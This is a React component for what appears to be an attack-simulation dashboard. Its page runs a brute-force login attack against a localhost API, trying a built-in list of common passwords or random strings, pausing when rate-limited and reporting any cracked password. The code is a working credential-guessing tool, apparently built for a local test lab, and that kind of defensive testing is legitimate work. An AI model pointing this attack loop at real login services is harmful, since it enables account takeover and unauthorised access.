import React, { useState } from 'react';
import { Lock, Play, RefreshCw, User, ShieldAlert, AlertTriangle, Terminal, Code } from 'lucide-react';
import axios from 'axios';
import { toast } from 'react-toastify';
import Console from '../components/common/Console';

// Backend URL
const TARGET_URL = 'http://localhost:8000';

const BruteForce = () => {
    // Attack Configuration State
    const [identifier, setIdentifier] = useState('admin@example.com');
    const [passwordSource, setPasswordSource] = useState('common');
    const [attemptCount, setAttemptCount] = useState(20);
    const [delay, setDelay] = useState(500);
    const [isAttacking, setIsAttacking] = useState(false);


    const [commonPasswords] = useState([
        "password123", "admin", "123456", "qwerty", "letmein",
        "welcome", "monkey", "dragon", "master", "password"
    ]);


    const [logs, setLogs] = useState([]);

    const generateRandomPassword = () => Math.random().toString(36).slice(-8);

    const addLog = (type, message, details = '') => {
        setLogs(prev => [...prev, { type, message, details }]);
    };

    const runAttackLoop = async () => {
        if (isAttacking) return;
        setIsAttacking(true);
        setLogs([]);
        addLog('info', `Starting Bruteforce Attack on ${identifier}...`, `Mode: ${passwordSource}, Count: ${attemptCount}`);

        let cancelled = false;

        for (let i = 0; i < attemptCount; i++) {
            if (cancelled) break;


            let passwordTry = "";
            if (passwordSource === 'common') {
                passwordTry = commonPasswords[i % commonPasswords.length];
            } else {
                passwordTry = generateRandomPassword();
            }

            // Delay mechanism
            if (i > 0 && delay > 0) {
                await new Promise(r => setTimeout(r, delay));
            }

            const attackData = {
                identifier: identifier,
                password: passwordTry,
                role: 'analyst'
            };

            try {
                const response = await axios.post(`${TARGET_URL}/api/v1/auth/login`, attackData);

                // Success (200 OK)
                addLog('success', `Attempt #${i + 1} - SUCCESS!`, `Credentials Found: ${passwordTry}`);
                toast.success(`CRACKED! Password is: ${passwordTry}`);
                cancelled = true;
                setIsAttacking(false);
                return;
            } catch (error) {
                if (error.response) {
                    const status = error.response.status;
                    if (status === 401) {

                        addLog('error', `Attempt #${i + 1} - Failed (401)`, `Tried: ${passwordTry}`);
                    } else if (status === 429) {
                        addLog('warning', `Attempt #${i + 1} - Rate Limited (429)`, "Slow down!");

                        await new Promise(r => setTimeout(r, 1000));
                    } else if (status === 404) {
                        addLog('error', `Attempt #${i + 1} - User Not Found (404)`, `User: ${identifier}`);

                    } else {
                        addLog('error', `Attempt #${i + 1} - Error ${status}`, error.response.data?.message);
                    }
                } else {
                    addLog('error', `Network Error`, error.message);
                }
            }
        }

        if (!cancelled) {
            addLog('info', 'Bruteforce Campaign Finished', 'Password not found in current dictionary/attempts.');
            toast.info('Attack Finished');
        }

        setIsAttacking(false);
    };

    return (
        <div className="space-y-6">
            {/* Header Section */}
            <div>
                <h2 className="text-2xl font-bold text-cyan-400 flex items-center gap-2">
                    <Lock className="text-cyan-400" />
                    Bruteforce Login Attack
                </h2>
                <p className="text-gray-400 text-sm mt-1">Simulate credential bruteforce attacks using common or random password lists</p>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">

                {/* Left Column: Configuration */}
                <div className="space-y-6">
                    {/* Attack Config Panel */}
                    <div className="bg-gray-900/50 border border-gray-800 rounded-xl p-6">
                        <h3 className="text-lg font-semibold text-gray-200 mb-6">Attack Configuration</h3>

                        <div className="space-y-5">
                            <div>
                                <label className="block text-xs font-medium text-gray-500 uppercase mb-2">Identifier (email/username)</label>
                                <input
                                    type="text"
                                    value={identifier}
                                    onChange={(e) => setIdentifier(e.target.value)}
                                    className="w-full bg-gray-950 border border-gray-800 rounded-lg px-4 py-3 text-gray-200 focus:outline-none focus:border-cyan-500/50 transition-colors"
                                    placeholder="target@example.com"
                                />
                            </div>

                            <div>
                                <label className="block text-xs font-medium text-gray-500 uppercase mb-2">Password Source</label>
                                <div className="flex bg-gray-950 p-1 rounded-lg border border-gray-800">
                                    <button
                                        onClick={() => setPasswordSource('common')}
                                        className={`flex-1 py-2 text-sm font-medium rounded-md transition-all ${passwordSource === 'common'
                                            ? 'bg-cyan-900/30 text-cyan-400 border border-cyan-500/30 shadow-sm'
                                            : 'text-gray-500 hover:text-gray-300'
                                            }`}
                                    >
                                        Common List
                                    </button>
                                    <button
                                        onClick={() => setPasswordSource('random')}
                                        className={`flex-1 py-2 text-sm font-medium rounded-md transition-all ${passwordSource === 'random'
                                            ? 'bg-purple-900/30 text-purple-400 border border-purple-500/30 shadow-sm'
                                            : 'text-gray-500 hover:text-gray-300'
                                            }`}
                                    >
                                        Random
                                    </button>
                                </div>
                            </div>

                            <div className="space-y-4 pt-2">
                                <div>
                                    <label className="block text-xs font-medium text-gray-500 uppercase mb-2">Number of Attempts</label>
                                    <input
                                        type="number"
                                        value={attemptCount}
                                        onChange={(e) => setAttemptCount(Number(e.target.value))}
                                        className="w-full bg-gray-950 border border-gray-800 rounded-lg px-4 py-3 text-gray-200 focus:outline-none focus:border-cyan-500/50"
                                    />
                                </div>
                                <div>
                                    <label className="block text-xs font-medium text-gray-500 uppercase mb-2">Delay Between Attempts (ms)</label>
                                    <input
                                        type="number"
                                        value={delay}
                                        onChange={(e) => setDelay(Number(e.target.value))}
                                        className="w-full bg-gray-950 border border-gray-800 rounded-lg px-4 py-3 text-gray-200 focus:outline-none focus:border-cyan-500/50"
                                    />
                                </div>
                            </div>
                        </div>
                    </div>

                    {/* Common Password List Panel */}
                    <div className="bg-gray-900/50 border border-gray-800 rounded-xl p-6">
                        <h3 className="text-sm font-semibold text-gray-400 mb-4 uppercase tracking-wider">Common Password List</h3>
                        <div className="flex flex-wrap gap-2">
                            {commonPasswords.map((pass, idx) => (
                                <span key={idx} className="px-3 py-1.5 bg-gray-950 border border-gray-800 rounded-md text-xs font-mono text-gray-400 select-none hover:border-gray-700 hover:text-gray-300 transition-colors">
                                    {pass}
                                </span>
                            ))}
                        </div>
                    </div>
                </div>

                {/* Right Column: Preview & Launch */}
                <div className="space-y-6">
                    {/* Payload Preview */}
                    <div className="bg-gray-900/50 border border-gray-800 rounded-xl p-6 h-fit">
                        <div className="flex items-center justify-between mb-4">
                            <h3 className="text-lg font-semibold text-gray-200">Payload Preview</h3>
                        </div>
                        <div className="bg-gray-950 rounded-xl p-5 border border-gray-800 font-mono text-sm overflow-hidden relative group">
                            <div className="absolute inset-0 bg-gradient-to-br from-cyan-500/5 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none"></div>
                            <pre className="text-gray-300">
                                {`{
  "identifier": "${identifier}",
  "password": "${passwordSource === 'common' ? 'password123' : generateRandomPassword()}",
  "role": "analyst"
}`}
                            </pre>
                        </div>
                    </div>

                    {/* Launch Button */}
                    <button
                        onClick={runAttackLoop}
                        disabled={isAttacking}
                        className={`
                            w-full py-5 rounded-xl font-bold tracking-widest text-lg transition-all duration-300 
                            shadow-lg uppercase flex items-center justify-center gap-3
                            ${isAttacking
                                ? 'bg-red-900/20 text-red-500/50 cursor-not-allowed border border-red-900/30'
                                : 'bg-gradient-to-r from-red-600 to-red-700 hover:from-red-500 hover:to-red-600 text-white shadow-red-900/30 hover:shadow-red-900/50 hover:-translate-y-0.5 active:translate-y-0'
                            }
                        `}
                    >
                        {isAttacking ? 'Executing Attack...' : 'Launch Attack'}
                    </button>

                    {/* Warning Alert */}
                    <div className="bg-yellow-950/20 border border-yellow-900/30 rounded-xl p-4 flex items-start gap-3">
                        <AlertTriangle className="text-yellow-500 shrink-0 mt-0.5" size={20} />
                        <div>
                            <h4 className="text-yellow-500 font-medium text-sm mb-1">Warning</h4>
                            <p className="text-yellow-500/80 text-xs leading-relaxed">
                                This attack will stop automatically if valid credentials are found or all attempts are exhausted.
                            </p>
                        </div>
                    </div>
                </div>
            </div>

            {/* Real-time Console */}
            <div>
                <h3 className="text-sm font-semibold text-gray-400 mb-3 ml-1">Real-time Console</h3>
                <Console logs={logs} />
            </div>
        </div>
    );
};

export default BruteForce;
